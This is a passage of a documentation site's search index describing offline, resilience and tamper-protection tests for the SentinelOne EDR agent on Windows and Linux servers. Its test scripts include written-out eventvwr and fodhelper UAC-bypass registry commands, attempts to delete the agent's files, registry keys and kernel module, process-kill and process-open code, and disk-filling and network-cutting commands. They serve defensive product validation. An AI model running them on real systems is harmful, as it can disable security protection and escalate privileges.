connection\n# Monitor response times dan functionality\n</code></pre></p> <p>Phase 2: Intermittent Connectivity <pre><code># Simulate connection drops\n# Script untuk on/off network secara periodik\nfor i in {1..10}; do\n    sudo ip link set eth0 down\n    sleep 30\n    sudo ip link set eth0 up\n    sleep 60\ndone\n\n# Monitor:\n# - Agent reconnection behavior\n# - Data synchronization\n# - Policy updates\n# - Alert forwarding\n</code></pre></p> <p>Phase 3: Complete Isolation <pre><code># Complete network isolation\nsudo iptables -A OUTPUT -j DROP\nsudo iptables -A INPUT -j DROP\n\n# Verify complete isolation\nping 8.8.8.8  # Should fail\ncurl -I https://google.com  # Should fail\n\n# Test protection capabilities\n# Run various malware tests\n</code></pre></p>"},{"location":"testing/kategori-b-offline/#b32-reconnection-and-synchronization","title":"B3.2: Reconnection and Synchronization","text":"<p>Network Restoration: <pre><code># Restore network connectivity\n# Linux:\nsudo iptables -F\nsudo ip link set eth0 up\n\n# Windows:\nGet-NetAdapter | Enable-NetAdapter\n</code></pre></p> <p>Synchronization Testing: <pre><code># Monitor synchronization process\n# Check logs untuk:\n# - Agent check-in dengan management console\n# - Policy synchronization\n# - Event log uploading\n# - Threat intelligence updates\n\n# Windows:\nGet-EventLog -LogName Application -Source \"SentinelOne\"\n\n# Linux:\nsudo tail -f /var/log/sentinelone/agent.log\n</code></pre></p>"},{"location":"testing/kategori-b-offline/#b4-cached-policy-enforcement","title":"\ud83d\udcbe B4: Cached Policy Enforcement","text":""},{"location":"testing/kategori-b-offline/#tujuan-testing_3","title":"Tujuan Testing","text":"<p>Validasi bahwa cached policies tetap enforced selama offline period dan update properly ketika reconnect.</p>"},{"location":"testing/kategori-b-offline/#test-scenarios_3","title":"Test Scenarios","text":""},{"location":"testing/kategori-b-offline/#b41-policy-cache-validation","title":"B4.1: Policy Cache Validation","text":"<p>Before Going Offline: <pre><code># Document current policy settings\n# Windows:\nsentinelctl status\nsentinelctl policy list\n\n# Linux:\nsudo /opt/sentinelone/bin/sentinelctl status\nsudo /opt/sentinelone/bin/sentinelctl policy list\n</code></pre></p> <p>During Offline Period: <pre><code># Test each policy enforcement:\n# 1. File type restrictions\n# 2. Application whitelisting/blacklisting  \n# 3. Network access controls\n# 4. User behavior policies\n# 5. Threat response actions\n\n# Verify policies masih aktif dan enforced\n</code></pre></p>"},{"location":"testing/kategori-b-offline/#b42-policy-conflict-resolution","title":"B4.2: Policy Conflict Resolution","text":"<p>Simulate Policy Changes During Offline: <pre><code># Scenario: Management console mengubah policy saat agent offline\n# Ketika reconnect, test:\n# - Policy synchronization\n# - Conflict resolution\n# - Retroactive enforcement\n</code></pre></p>"},{"location":"testing/kategori-b-offline/#offline-testing-metrics","title":"\ud83d\udcca Offline Testing Metrics","text":""},{"location":"testing/kategori-b-offline/#key-performance-indicators","title":"Key Performance Indicators","text":"Test Case Success Criteria Measurement Method Offline Malware Detection &gt;99% detection rate EICAR &amp; sample testing Uninstall Protection 100% prevention Tamper attempt blocking Network Recovery &lt;60s sync time Reconnection monitoring Policy Enforcement 100% compliance Policy validation tests Self-Protection 0% successful tampering Advanced attack simulation"},{"location":"testing/kategori-b-offline/#demo-validation-checklist","title":"Demo Validation Checklist","text":""},{"location":"testing/kategori-b-offline/#offline-protection-validation","title":"Offline Protection Validation","text":"<ul> <li>[ ] Threat Detection: Malware masih terdeteksi offline</li> <li>[ ] Real-time Protection: Blocking masih efektif</li> <li>[ ] Behavioral Analysis: Suspicious activity monitoring aktif</li> <li>[ ] Quarantine Functionality: Local quarantine berfungsi</li> <li>[ ] Logging Integrity: Event logging tetap comprehensive</li> </ul>"},{"location":"testing/kategori-b-offline/#self-protection-validation","title":"Self-Protection Validation","text":"<ul> <li>[ ] Uninstall Prevention: Standard removal methods blocked</li> <li>[ ] Service Protection: Critical services tidak bisa dihentikan</li> <li>[ ] Process Protection: Agent processes tidak bisa dimatikan</li> <li>[ ] Configuration Integrity: Settings tidak bisa diubah tanpa auth</li> <li>[ ] Tamper Detection: Semua attempt tercatat dan diblokir</li> </ul>"},{"location":"testing/kategori-b-offline/#recovery-sync-validation","title":"Recovery &amp; Sync Validation","text":"<ul> <li>[ ] Automatic Reconnection: Agent otomatis reconnect</li> <li>[ ] Data Synchronization: Events dan alerts tersinkronisasi</li> <li>[ ] Policy Updates: Policy terbaru berhasil diapply</li> <li>[ ] Status Reporting: Current status akurat di console</li> <li>[ ] Threat Intelligence: Updates ter-download dan aktif</li> </ul>"},{"location":"testing/kategori-b-offline/#demo-presentation-highlights","title":"Demo Presentation Highlights","text":""},{"location":"testing/kategori-b-offline/#executive-talking-points","title":"Executive Talking Points","text":"<ol> <li>\"Offline Protection Capability\"</li> <li>Server tetap terlindungi meski network down</li> <li>Local intelligence dan cached policies memastikan continuity</li> <li> <p>Zero security gaps selama network outage</p> </li> <li> <p>\"Tamper-Proof Architecture\" </p> </li> <li>Uninstall attempts diblokir bahkan oleh administrator</li> <li>Self-healing capabilities menjaga integrity</li> <li> <p>Advanced persistent threats tidak bisa disable protection</p> </li> <li> <p>\"Seamless Recovery\"</p> </li> <li>Automatic reconnection dan synchronization</li> <li>No manual intervention required</li> <li>Complete audit trail maintained</li> </ol>"},{"location":"testing/kategori-b-offline/#live-demo-script","title":"Live Demo Script","text":"<ol> <li>Setup: Tampilkan agent status dan connectivity</li> <li>Disconnect: Simulasi network failure</li> <li>Attack: Jalankan malware test dalam kondisi offline</li> <li>Block: Tunjukkan protection masih aktif</li> <li>Tamper: Attempt uninstall berbagai cara</li> <li>Fail: Semua tamper attempts gagal</li> <li>Reconnect: Restore network connectivity</li> <li>Sync: Monitor synchronization process</li> <li>Verify: Confirm complete protection restoration</li> </ol>"},{"location":"testing/kategori-b-offline/#next-steps","title":"Next Steps","text":"<p>Lanjutkan ke testing categories berikutnya: - Kategori C: Operational Resilience - Kategori D: Security Hardening - Windows-specific Offline Testing - Linux-specific Offline Testing</p> <p>Demo Critical</p> <p>Kategori B testing adalah MOST CRITICAL untuk demo ke atasan. Offline protection dan tamper resistance adalah key differentiator yang akan impress stakeholder tentang robustness SentinelOne EDR.</p>"},{"location":"testing/kategori-c-operational/","title":"Kategori C: Operational Resilience Testing","text":""},{"location":"testing/kategori-c-operational/#overview","title":"Overview","text":"<p>Testing kemampuan SentinelOne EDR dalam mempertahankan operasional dan pulih dari berbagai kondisi stres, failure, dan anomali sistem yang mungkin terjadi di production environment.</p>"},{"location":"testing/kategori-c-operational/#c1-service-recovery-testing","title":"\ud83d\udee0\ufe0f C1: Service Recovery Testing","text":""},{"location":"testing/kategori-c-operational/#tujuan-testing","title":"Tujuan Testing","text":"<p>Memvalidasi kemampuan self-healing dan automatic recovery SentinelOne setelah service interruption atau failure.</p>"},{"location":"testing/kategori-c-operational/#test-scenarios","title":"Test Scenarios","text":""},{"location":"testing/kategori-c-operational/#c11-service-termination-and-recovery","title":"C1.1: Service Termination and Recovery","text":"<p>Windows Server: <pre><code># Test 1: Force stop SentinelOne services\nStop-Service -Name \"SentinelAgent\" -Force\nStop-Service -Name \"SentinelHelperService\" -Force\n\n# Monitor automatic recovery\nGet-Service -Name \"*Sentinel*\" | Select-Object Name, Status\nStart-Sleep -Seconds 30\nGet-Service -Name \"*Sentinel*\" | Select-Object Name, Status\n\n# Expected Results:\n# - Services automatically restart within 30 seconds\n# - No data loss or configuration corruption\n# - Protection capabilities immediately restored\n# - Event logging captures recovery process\n</code></pre></p> <p>Linux Server: <pre><code># Test 1: Kill SentinelOne processes\nsudo systemctl stop sentinelone-agent\nsudo kill -9 $(pidof sentinelone-agent)\n\n# Monitor automatic recovery  \nwatch -n 5 'systemctl status sentinelone-agent'\n\n# Expected Results:\n# - Process automatically restarts\n# - Service recovery logged to syslog\n# - Agent reconnects to management console\n# - Protection status maintained\n</code></pre></p>"},{"location":"testing/kategori-c-operational/#c12-configuration-corruption-recovery","title":"C1.2: Configuration Corruption Recovery","text":"<p>Windows Server: <pre><code># Simulate configuration corruption\n$configPath = \"C:\\Program Files\\SentinelOne\\Sentinel Agent\\config\\\"\nCopy-Item \"$configPath\\agent.conf\" \"$configPath\\agent.conf.backup\"\n\"corrupted_config_data\" | Out-File \"$configPath\\agent.conf\" -Encoding ASCII\n\n# Restart service and monitor recovery\nRestart-Service -Name \"SentinelAgent\"\nStart-Sleep -Seconds 60\n\n# Validate recovery\nsentinelctl status\n</code></pre></p> <p>Linux Server: <pre><code># Simulate configuration corruption\nsudo cp /etc/sentinelone/agent.conf /etc/sentinelone/agent.conf.backup\necho \"corrupted_config_data\" | sudo tee /etc/sentinelone/agent.conf\n\n# Restart and monitor recovery\nsudo systemctl restart sentinelone-agent\nsleep 60\n\n# Validate recovery\nsudo /opt/sentinelone/bin/sentinelctl status\n</code></pre></p>"},{"location":"testing/kategori-c-operational/#c2-resource-exhaustion-scenarios","title":"\u26a1 C2: Resource Exhaustion Scenarios","text":""},{"location":"testing/kategori-c-operational/#tujuan-testing_1","title":"Tujuan Testing","text":"<p>Testing behavior SentinelOne dalam kondisi resource exhaustion (CPU, Memory, Disk).</p>"},{"location":"testing/kategori-c-operational/#test-scenarios_1","title":"Test Scenarios","text":""},{"location":"testing/kategori-c-operational/#c21-cpu-stress-testing","title":"C2.1: CPU Stress Testing","text":"<p>Windows Server: <pre><code># Create CPU stress using PowerShell\n1..8 | ForEach-Object { \n    Start-Job -ScriptBlock { \n        while($true) { \n            1..100000 | ForEach-Object { $null = $_ * $_ } \n        } \n    } \n}\n\n# Monitor SentinelOne performance during stress\nwhile($true) {\n    Get-Process -Name \"*Sentinel*\" | Select-Object Name, CPU, WorkingSet\n    Start-Sleep -Seconds 10\n}\n\n# Expected Behavior:\n# - Agent maintains reasonable resource usage\n# - Protection capabilities remain functional\n# - No service crashes or hangs\n# - Performance gracefully degrades if needed\n</code></pre></p> <p>Linux Server: <pre><code># Create CPU stress using stress-ng\nsudo apt install stress-ng -y\nstress-ng --cpu 8 --timeout 300s &amp;\n\n# Monitor SentinelOne during stress\nwhile true; do\n    ps aux | grep sentinelone | head -5\n    top -p $(pidof sentinelone-agent) -n 1\n    sleep 10\ndone\n</code></pre></p>"},{"location":"testing/kategori-c-operational/#c22-memory-pressure-testing","title":"C2.2: Memory Pressure Testing","text":"<p>Windows Server: <pre><code># Create memory pressure\n$memoryArray = @()\nfor($i=0; $i -lt 1000; $i++) {\n    $memoryArray += New-Object byte[] 10MB\n}\n\n# Monitor SentinelOne memory usage\nGet-Process -Name \"*Sentinel*\" | Select-Object Name, WorkingSet, PagedMemorySize\n</code></pre></p> <p>Linux Server: <pre><code># Create memory pressure\nstress-ng --vm 4 --vm-bytes 1G --timeout 300s &amp;\n\n# Monitor memory usage\nfree -h\nps aux | grep sentinelone\n</code></pre></p>"},{"location":"testing/kategori-c-operational/#c23-disk-space-exhaustion","title":"C2.3: Disk Space Exhaustion","text":"<p>Windows Server: <pre><code># Fill up disk space (carefully!)\n$targetDrive = \"C:\"\n$freeSpace = (Get-WmiObject -Class Win32_LogicalDisk -Filter \"DeviceID='$targetDrive'\").FreeSpace\n$fillSize = $freeSpace - 100MB  # Leave 100MB free\n\n# Create large file to consume space\nfsutil file createnew \"C:\\temp\\largefile.tmp\" $fillSize\n\n# Monitor SentinelOne behavior\nsentinelctl status\nGet-EventLog -LogName Application -Source \"SentinelOne\" -Newest 10\n</code></pre></p>"},{"location":"testing/kategori-c-operational/#c3-system-reboot-validation","title":"\ud83d\udd04 C3: System Reboot Validation","text":""},{"location":"testing/kategori-c-operational/#tujuan-testing_2","title":"Tujuan Testing","text":"<p>Memvalidasi bahwa SentinelOne proper startup setelah system reboot dan maintain protection state.</p>"},{"location":"testing/kategori-c-operational/#test-scenarios_2","title":"Test Scenarios","text":""},{"location":"testing/kategori-c-operational/#c31-normal-reboot-testing","title":"C3.1: Normal Reboot Testing","text":"<p>Pre-Reboot Documentation: <pre><code># Windows - Document pre-reboot state\nsentinelctl status &gt; C:\\temp\\pre-reboot-status.txt\nGet-Service -Name \"*Sentinel*\" &gt; C:\\temp\\pre-reboot-services.txt\nGet-Process -Name \"*Sentinel*\" &gt; C:\\temp\\pre-reboot-processes.txt\n</code></pre></p> <pre><code># Linux - Document pre-reboot state\nsudo /opt/sentinelone/bin/sentinelctl status &gt; /tmp/pre-reboot-status.txt\nsystemctl status sentinelone-agent &gt; /tmp/pre-reboot-services.txt\nps aux | grep sentinelone &gt; /tmp/pre-reboot-processes.txt\n</code></pre> <p>Reboot and Validation: <pre><code># Windows - Planned reboot\nshutdown /r /t 0\n\n# Post-reboot validation (run after restart)\nsentinelctl status\nCompare-Object (Get-Content C:\\temp\\pre-reboot-status.txt) (sentinelctl status)\n</code></pre></p> <pre><code># Linux - Planned reboot\nsudo reboot\n\n# Post-reboot validation\nsudo /opt/sentinelone/bin/sentinelctl status\ndiff /tmp/pre-reboot-status.txt &lt;(sudo /opt/sentinelone/bin/sentinelctl status)\n</code></pre>"},{"location":"testing/kategori-c-operational/#c32-forced-shutdown-recovery","title":"C3.2: Forced Shutdown Recovery","text":"<p>Windows Server: <pre><code># Simulate forced shutdown (power loss)\n# WARNING: This will cause ungraceful shutdown\nwmic os where Primary='TRUE' reboot\n</code></pre></p> <p>Post-Recovery Validation: <pre><code># Check for file system corruption recovery\n# Check SentinelOne integrity\n# Validate all services started properly\n# Confirm protection is active\n</code></pre></p>"},{"location":"testing/kategori-c-operational/#c4-update-failure-recovery","title":"\ud83d\udd27 C4: Update Failure Recovery","text":""},{"location":"testing/kategori-c-operational/#tujuan-testing_3","title":"Tujuan Testing","text":"<p>Testing kemampuan recovery ketika update process gagal atau interrupted.</p>"},{"location":"testing/kategori-c-operational/#test-scenarios_3","title":"Test Scenarios","text":""},{"location":"testing/kategori-c-operational/#c41-interrupted-update-simulation","title":"C4.1: Interrupted Update Simulation","text":"<p>Windows Server: <pre><code># Start update process\n# Simulate interruption during update\n$updateProcess = Get-Process -Name \"*SentinelUpdate*\" -ErrorAction SilentlyContinue\nif($updateProcess) {\n    Stop-Process -Id $updateProcess.Id -Force\n}\n\n# Monitor recovery process\nsentinelctl status\nGet-EventLog -LogName Application -Source \"SentinelOne\" -Newest 5\n</code></pre></p>"},{"location":"testing/kategori-c-operational/#c42-rollback-validation","title":"C4.2: Rollback Validation","text":"<p>Test Rollback Mechanisms: <pre><code># Document current version\nsentinelctl version\n\n# After failed update, verify:\n# - System rolled back to previous stable version\n# - No loss of protection capability\n# - Configuration integrity maintained\n# - All services operational\n</code></pre></p>"},{"location":"testing/kategori-c-operational/#operational-resilience-metrics","title":"\ud83d\udcca Operational Resilience Metrics","text":""},{"location":"testing/kategori-c-operational/#key-performance-indicators","title":"Key Performance Indicators","text":"Test Case Recovery Target Measurement Service Recovery &lt;30 seconds Service restart time CPU Stress Impact &lt;25% degradation Performance impact Memory Usage &lt;500MB increase Memory overhead Boot Time Impact &lt;10% increase Startup delay Update Recovery &lt;60 seconds Rollback completion"},{"location":"testing/kategori-c-operational/#validation-checklist","title":"Validation Checklist","text":""},{"location":"testing/kategori-c-operational/#service-resilience","title":"Service Resilience","text":"<ul> <li>[ ] Automatic Recovery: Services self-heal without intervention</li> <li>[ ] Configuration Integrity: Settings preserved through failures</li> <li>[ ] Data Consistency: No data loss during recovery</li> <li>[ ] Performance Maintenance: Acceptable performance under stress</li> <li>[ ] Monitoring Continuity: Logging remains functional</li> </ul>"},{"location":"testing/kategori-c-operational/#system-integration","title":"System Integration","text":"<ul> <li>[ ] Boot Sequence: Proper startup order and timing</li> <li>[ ] Resource Management: Efficient resource utilization</li> <li>[ ] Conflict Resolution: Handles conflicts with other software</li> <li>[ ] Update Reliability: Safe and recoverable update process</li> <li>[ ] Rollback Capability: Reliable fallback mechanisms</li> </ul>"},{"location":"testing/kategori-c-operational/#demo-presentation-points","title":"Demo Presentation Points","text":""},{"location":"testing/kategori-c-operational/#executive-summary","title":"Executive Summary","text":"<ol> <li>\"Self-Healing Architecture\"</li> <li>Automatic recovery from service failures</li> <li>No manual intervention required</li> <li> <p>Maintains protection during stress conditions</p> </li> <li> <p>\"Production-Ready Reliability\"</p> </li> <li>Handles real-world operational challenges</li> <li>Graceful degradation under resource pressure</li> <li> <p>Robust update and recovery mechanisms</p> </li> <li> <p>\"Zero Maintenance Overhead\"</p> </li> <li>Self-monitoring and self-correction</li> <li>Proactive issue resolution</li> <li>Minimal administrative burden</li> </ol>"},{"location":"testing/kategori-c-operational/#technical-demonstrations","title":"Technical Demonstrations","text":"<ul> <li>Live service failure and recovery</li> <li>Resource stress testing with monitoring</li> <li>Reboot cycle validation</li> <li>Update process reliability testing</li> </ul>"},{"location":"testing/kategori-c-operational/#next-steps","title":"Next Steps","text":"<p>Continue to additional testing categories: - Kategori D: Security Hardening - Kategori E: Performance Impact</p> <p>Operational Excellence</p> <p>Kategori C demonstrates SentinelOne's enterprise-grade reliability and operational resilience essential for mission-critical server environments.</p>"},{"location":"testing/kategori-d-security/","title":"Kategori D: Security Hardening Testing","text":""},{"location":"testing/kategori-d-security/#overview","title":"Overview","text":"<p>Testing komprehensif kemampuan security hardening SentinelOne EDR, termasuk tamper protection, privilege escalation prevention, dan advanced security mechanisms yang melindungi agent dari sophisticated attacks.</p>"},{"location":"testing/kategori-d-security/#d1-tamper-protection-testing","title":"\ud83d\udd12 D1: Tamper Protection Testing","text":""},{"location":"testing/kategori-d-security/#tujuan-testing","title":"Tujuan Testing","text":"<p>Memvalidasi kemampuan SentinelOne melindungi dirinya sendiri dari berbagai upaya tampering, modification, dan disabling oleh attacker atau malicious insider.</p>"},{"location":"testing/kategori-d-security/#test-scenarios","title":"Test Scenarios","text":""},{"location":"testing/kategori-d-security/#d11-registry-tampering-attempts","title":"D1.1: Registry Tampering Attempts","text":"<p>Windows Server: <pre><code># Test 1: Direct registry modification attempts\n$sentinelRegPaths = @(\n    \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\SentinelAgent\",\n    \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\{SentinelOne-GUID}\",\n    \"HKLM:\\SOFTWARE\\SentinelOne\"\n)\n\nforeach($path in $sentinelRegPaths) {\n    try {\n        # Attempt to delete critical registry keys\n        Remove-Item -Path $path -Recurse -Force -ErrorAction Stop\n        Write-Host \"\u274c SECURITY BREACH: Registry key $path was deleted!\"\n    }\n    catch {\n        Write-Host \"\u2705 PROTECTED: Registry key $path modification blocked - $($_.Exception.Message)\"\n    }\n}\n\n# Test 2: Registry value modification\ntry {\n    Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\SentinelAgent\" -Name \"Start\" -Value 4\n    Write-Host \"\u274c SECURITY BREACH: Service startup type was modified!\"\n}\ncatch {\n    Write-Host \"\u2705 PROTECTED: Service configuration modification blocked\"\n}\n\n# Expected Results:\n# - All registry modification attempts should be blocked\n# - Tamper protection should log all attempts\n# - Registry integrity should be maintained\n# - No service disruption should occur\n</code></pre></p>"},{"location":"testing/kategori-d-security/#d12-file-system-tampering","title":"D1.2: File System Tampering","text":"<p>Windows Server: <pre><code># Test critical file modification/deletion\n$sentinelFiles = @(\n    \"C:\\Program Files\\SentinelOne\\Sentinel Agent\\SentinelAgent.exe\",\n    \"C:\\Program Files\\SentinelOne\\Sentinel Agent\\SentinelUI.exe\",\n    \"C:\\Windows\\System32\\drivers\\SentinelMonitor.sys\"\n)\n\nforeach($file in $sentinelFiles) {\n    # Test 1: File deletion attempt\n    try {\n        Remove-Item -Path $file -Force -ErrorAction Stop\n        Write-Host \"\u274c CRITICAL: File $file was deleted!\"\n    }\n    catch {\n        Write-Host \"\u2705 PROTECTED: File deletion blocked for $file\"\n    }\n\n    # Test 2: File modification attempt\n    try {\n        \"malicious_content\" | Out-File -FilePath $file -Encoding ASCII -ErrorAction Stop\n        Write-Host \"\u274c CRITICAL: File $file was modified!\"\n    }\n    catch {\n        Write-Host \"\u2705 PROTECTED: File modification blocked for $file\"\n    }\n}\n</code></pre></p> <p>Linux Server: <pre><code># Test critical file protection\nSENTINEL_FILES=(\n    \"/opt/sentinelone/bin/sentinelone-agent\"\n    \"/etc/systemd/system/sentinelone.service\"\n    \"/lib/modules/$(uname -r)/kernel/drivers/sentinelone_kernel.ko\"\n)\n\nfor file in \"${SENTINEL_FILES[@]}\"; do\n    echo \"Testing protection for: $file\"\n\n    # Test deletion\n    sudo rm -f \"$file\" 2&gt;/dev/null\n    if [ -f \"$file\" ]; then\n        echo \"\u2705 PROTECTED: File deletion blocked\"\n    else\n        echo \"\u274c CRITICAL: File was deleted!\"\n    fi\n\n    # Test modification  \n    echo \"malicious_content\" | sudo tee \"$file\" &gt;/dev/null 2&gt;&amp;1\n    if ! grep -q \"malicious_content\" \"$file\" 2&gt;/dev/null; then\n        echo \"\u2705 PROTECTED: File modification blocked\"\n    else\n        echo \"\u274c CRITICAL: File was modified!\"\n    fi\ndone\n</code></pre></p>"},{"location":"testing/kategori-d-security/#d13-process-protection-testing","title":"D1.3: Process Protection Testing","text":"<p>Windows Server: <pre><code># Test process termination protection\n$sentinelProcesses = Get-Process -Name \"*Sentinel*\" -ErrorAction SilentlyContinue\n\nforeach($process in $sentinelProcesses) {\n    Write-Host \"Testing protection for process: $($process.ProcessName) (PID: $($process.Id))\"\n\n    try {\n        # Attempt normal termination\n        Stop-Process -Id $process.Id -ErrorAction Stop\n        Write-Host \"\u274c CRITICAL: Process $($process.ProcessName) was terminated normally!\"\n    }\n    catch {\n        Write-Host \"\u2705 PROTECTED: Normal termination blocked for $($process.ProcessName)\"\n    }\n\n    try {\n        # Attempt forced termination\n        Stop-Process -Id $process.Id -Force -ErrorAction Stop\n        Write-Host \"\u274c CRITICAL: Process $($process.ProcessName) was force-terminated!\"\n    }\n    catch {\n        Write-Host \"\u2705 PROTECTED: Force termination blocked for $($process.ProcessName)\"\n    }\n}\n\n# Test using external tools\ntry {\n    taskkill /F /IM SentinelAgent.exe\n    Write-Host \"\u274c CRITICAL: External termination succeeded!\"\n}\ncatch {\n    Write-Host \"\u2705 PROTECTED: External termination blocked\"\n}\n</code></pre></p> <p>Linux Server: <pre><code># Test process protection\nSENTINEL_PIDS=$(pidof sentinelone-agent)\n\nfor pid in $SENTINEL_PIDS; do\n    echo \"Testing protection for PID: $pid\"\n\n    # Test SIGTERM\n    sudo kill -TERM $pid\n    sleep 2\n    if kill -0 $pid 2&gt;/dev/null; then\n        echo \"\u2705 PROTECTED: SIGTERM ignored\"\n    else\n        echo \"\u274c CRITICAL: Process terminated by SIGTERM\"\n    fi\n\n    # Test SIGKILL\n    sudo kill -9 $pid\n    sleep 2\n    if kill -0 $pid 2&gt;/dev/null; then\n        echo \"\u2705 PROTECTED: SIGKILL ignored\"\n    else\n        echo \"\u274c CRITICAL: Process terminated by SIGKILL\"\n    fi\ndone\n</code></pre></p>"},{"location":"testing/kategori-d-security/#d2-privilege-escalation-prevention","title":"\ud83d\udee1\ufe0f D2: Privilege Escalation Prevention","text":""},{"location":"testing/kategori-d-security/#tujuan-testing_1","title":"Tujuan Testing","text":"<p>Testing kemampuan SentinelOne mendeteksi dan mencegah privilege escalation attempts.</p>"},{"location":"testing/kategori-d-security/#test-scenarios_1","title":"Test Scenarios","text":""},{"location":"testing/kategori-d-security/#d21-uac-bypass-attempts","title":"D2.1: UAC Bypass Attempts","text":"<p>Windows Server: <pre><code># Test UAC bypass techniques\n# CATATAN: Ini untuk testing purposes saja\n\n# Test 1: eventvwr.exe UAC bypass\n$bypassCommand = 'reg add \"HKCU\\Software\\Classes\\mscfile\\shell\\open\\command\" /ve /d \"powershell.exe -c whoami &gt; C:\\temp\\uac-bypass-test.txt\" /f'\ncmd /c $bypassCommand\neventvwr.exe\n\n# Wait and check if bypass succeeded\nStart-Sleep -Seconds 10\nif(Test-Path \"C:\\temp\\uac-bypass-test.txt\") {\n    Write-Host \"\u274c UAC BYPASS SUCCEEDED\"\n    Remove-Item \"C:\\temp\\uac-bypass-test.txt\" -Force\n} else {\n    Write-Host \"\u2705 UAC BYPASS PREVENTED\"\n}\n\n# Test 2: fodhelper.exe UAC bypass\nreg add \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /ve /d \"powershell.exe -c whoami &gt; C:\\temp\\fodhelper-bypass.txt\" /f\nfodhelper.exe\n\n# Expected Results:\n# - UAC bypass attempts should be detected\n# - Behavioral analysis should flag suspicious registry modifications\n# - Process execution should be monitored and potentially blocked\n</code></pre></p>"},{"location":"testing/kategori-d-security/#d22-sudo-privilege-escalation","title":"D2.2: Sudo Privilege Escalation","text":"<p>Linux Server: <pre><code># Test sudo privilege escalation attempts\n# Test 1: Sudo version vulnerabilities (if applicable)\nsudo --version\n\n# Test 2: SUID binary abuse\nfind /usr/bin -perm -4000 -type f 2&gt;/dev/null | head -10\n\n# Test common SUID escalation vectors\nfor binary in find vim less more nano; do\n    if [ -u \"/usr/bin/$binary\" ]; then\n        echo \"Testing SUID escalation via: $binary\"\n        # Attempt privilege escalation\n        # (Safe testing commands here)\n    fi\ndone\n\n# Expected Results:\n# - Privilege escalation attempts should be detected\n# - Suspicious SUID usage should be monitored\n# - Behavioral analysis should flag unusual privilege patterns\n</code></pre></p>"},{"location":"testing/kategori-d-security/#d23-windows-token-manipulation","title":"D2.3: Windows Token Manipulation","text":"<p>Windows Server: <pre><code># Test token manipulation techniques\n# CATATAN: Requires advanced PowerShell or C# code\n\n# Test 1: Token impersonation\nAdd-Type -TypeDefinition @\"\nusing System;\nusing System.Runtime.InteropServices;\nusing System.Security.Principal;\n\npublic class TokenManipulation\n{\n    [DllImport(\"advapi32.dll\", SetLastError = true)]\n    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);\n\n    [DllImport(\"kernel32.dll\", SetLastError = true)]\n    public static extern bool CloseHandle(IntPtr hObject);\n}\n\"@\n\n# Attempt token manipulation (safe test)\ntry {\n    $currentIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()\n    Write-Host \"Current Identity: $($currentIdentity.Name)\"\n\n    # Test token operations\n    # Expected: SentinelOne should detect and log this activity\n}\ncatch {\n    Write-Host \"Token manipulation attempt detected/blocked: $($_.Exception.Message)\"\n}\n</code></pre></p>"},{"location":"testing/kategori-d-security/#d3-agent-self-protection","title":"\ud83d\udd10 D3: Agent Self-Protection","text":""},{"location":"testing/kategori-d-security/#tujuan-testing_2","title":"Tujuan Testing","text":"<p>Memvalidasi kemampuan SentinelOne melindungi agent components dari sophisticated attacks.</p>"},{"location":"testing/kategori-d-security/#test-scenarios_2","title":"Test Scenarios","text":""},{"location":"testing/kategori-d-security/#d31-dll-injection-attempts","title":"D3.1: DLL Injection Attempts","text":"<p>Windows Server: <pre><code># Test DLL injection into SentinelOne processes\n$sentinelProcesses = Get-Process -Name \"*Sentinel*\"\n\nforeach($process in $sentinelProcesses) {\n    Write-Host \"Testing DLL injection protection for: $($process.ProcessName)\"\n\n    # Create test DLL injection attempt\n    # CATATAN: Ini simulasi untuk testing, bukan actual malicious DLL\n\n    try {\n        # Attempt to inject using PowerShell reflection\n        $processHandle = $process.Handle\n        Write-Host \"Process handle obtained: $processHandle\"\n\n        # Attempt memory allocation in target process\n        # Expected: Should be blocked by SentinelOne\n\n    }\n    catch {\n        Write-Host \"\u2705 DLL injection attempt blocked: $($_.Exception.Message)\"\n    }\n}\n\n# Expected Results:\n# - DLL injection attempts should be detected\n# - Process memory protection should prevent injection\n# - Behavioral analysis should flag injection patterns\n</code></pre></p>"},{"location":"testing/kategori-d-security/#d32-code-cave-attacks","title":"D3.2: Code Cave Attacks","text":"<p>Windows Server: <pre><code>// Test code cave injection (C code for compilation)\n// CATATAN: Compile sebagai test executable\n#include &lt;windows.h&gt;\n#include &lt;tlhelp32.h&gt;\n#include &lt;stdio.h&gt;\n\nint main() {\n    printf(\"Testing code cave protection...\\n\");\n\n    // Find SentinelOne process\n    PROCESSENTRY32 pe32;\n    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n\n    if(hProcessSnap != INVALID_HANDLE_VALUE) {\n        pe32.dwSize = sizeof(PROCESSENTRY32);\n\n        if(Process32First(hProcessSnap, &amp;pe32)) {\n            do {\n                if(strstr(pe32.szExeFile, \"Sentinel\") != NULL) {\n                    printf(\"Found SentinelOne process: %s (PID: %lu)\\n\", \n                           pe32.szExeFile, pe32.th32ProcessID);\n\n                    // Attempt to open process for memory manipulation\n                    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);\n                    if(hProcess != NULL) {\n                        printf(\"\u274c CRITICAL: Process opened successfully\\n\");\n                        CloseHandle(hProcess);\n                    } else {\n                        printf(\"\u2705 PROTECTED: Process access denied\\n\");\n                    }\n                }\n            } while(Process32Next(hProcessSnap, &amp;pe32));\n        }\n        CloseHandle(hProcessSnap);\n    }\n\n    return 0;\n}\n</code></pre></p>"},{"location":"testing/kategori-d-security/#d33-kernel-level-attacks","title":"D3.3: Kernel-Level Attacks","text":"<p>Linux Server: <pre><code># Test kernel-level protection mechanisms\necho \"Testing kernel module protection...\"\n\n# Test 1: Attempt to unload SentinelOne kernel module\nSENTINEL_MODULES=$(lsmod | grep sentinelone | awk '{print $1}')\n\nfor module in $SENTINEL_MODULES; do\n    echo \"Attempting to remove module: $module\"\n    sudo rmmod $module 2&gt;&amp;1\n\n    # Check if module still loaded\n    if lsmod | grep -q $module; then\n        echo \"\u2705 PROTECTED: Module removal blocked\"\n    else\n        echo \"\u274c CRITICAL: Module was removed!\"\n    fi\ndone\n\n# Test 2: Attempt to load malicious kernel module\necho \"Testing malicious module loading protection...\"\n# (Safe test that doesn't actually load malicious code)\n\n# Expected Results:\n# - Kernel module protection should prevent unloading\n# - Malicious module loading should be 